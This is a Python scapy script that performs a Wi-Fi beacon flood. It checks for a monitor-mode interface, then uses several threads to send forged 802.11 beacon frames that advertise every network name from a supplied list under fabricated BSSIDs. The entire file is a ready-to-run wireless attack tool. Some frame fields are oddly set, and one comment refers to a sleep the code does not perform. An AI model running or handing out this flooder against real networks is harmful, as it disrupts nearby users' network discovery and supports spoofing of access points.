#!/usr/bin/sudo /usr/bin/python3

from threading import Thread, Event
from scapy.all import *
import sys
import os

# Ensure at least two arguments are provided
if len(sys.argv) < 3:
    print("Usage: script.py <interface> <ssid_list_file>")
    sys.exit(1)

iface = sys.argv[1]
ssid_list_file = sys.argv[2]

# Validate if the interface exists and is in monitor mode
if not os.path.exists(f"/sys/class/net/{iface}"):
    print(f"Error: Network interface '{iface}' does not exist.")
    sys.exit(1)

try:
    with open(f"/sys/class/net/{iface}/type") as f:
        iface_type = f.read().strip()
        if iface_type != "803":  # 803 indicates monitor mode
            print(f"Error: Interface '{iface}' is not in monitor mode.")
            sys.exit(1)
except FileNotFoundError:
    print(f"Error: Unable to read the type of the interface '{iface}'.")
    sys.exit(1)

# Load the SSIDs into a list
try:
    with open(ssid_list_file, "r") as f:
        ssid_list = [line.strip().encode('utf-8') for line in f if line.strip()]
except FileNotFoundError:
    print(f"Error: File '{ssid_list_file}' not found.")
    sys.exit(1)

# Thread control
stop_event = Event()


def beacon_flood_thread(ssids, iface, stop_event):
    # Pre-generate static frame components
    src_mac = "ff:ff:ff:ff:ff:ff"
    dst_mac = "00:11:22:33:44:55"
    bss_base = "66:77:88:99:AA:"

    frame_template = RadioTap() / Dot11(type=0, subtype=8, addr1=dst_mac, addr2=src_mac, addr3="")

    try:
        while not stop_event.is_set():
            for idx, ssid in enumerate(ssids):
                bss = f"{bss_base}{idx:02X}"
                frame_template.addr3 = bss

                beacon = Dot11Beacon()
                ssid_element = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
                packet = frame_template / beacon / ssid_element

                sendp(packet, iface=iface, inter=0.1, loop=0, verbose=False)

                # Minimal sleep to avoid maxing out the CPU, adjust as needed
                if stop_event.is_set():
                    break
    except KeyboardInterrupt:
        pass


# Splitting SSIDs into equal chunks based on the number of available CPU cores
num_threads = min(len(ssid_list), os.cpu_count())
chunk_size = len(ssid_list) // num_threads

threads = []

for i in range(num_threads):
    start_idx = i * chunk_size
    end_idx = len(ssid_list) if i == num_threads - 1 else start_idx + chunk_size
    ssid_chunk = ssid_list[start_idx:end_idx]

    thread = Thread(target=beacon_flood_thread, args=(ssid_chunk, iface, stop_event))
    thread.daemon = True
    threads.append(thread)
    thread.start()

print(
    f"Beacon flood started on interface '{iface}' with {len(ssid_list)} SSIDs using {num_threads} threads. Press Ctrl+C to stop.")

try:
    # Keep the main thread alive while the child threads run
    while any(thread.is_alive() for thread in threads):
        for thread in threads:
            thread.join(timeout=1)
except KeyboardInterrupt:
    print("\nStopping beacon flood...")
    stop_event.set()
    for thread in threads:
        thread.join()

print("Beacon flood stopped.")

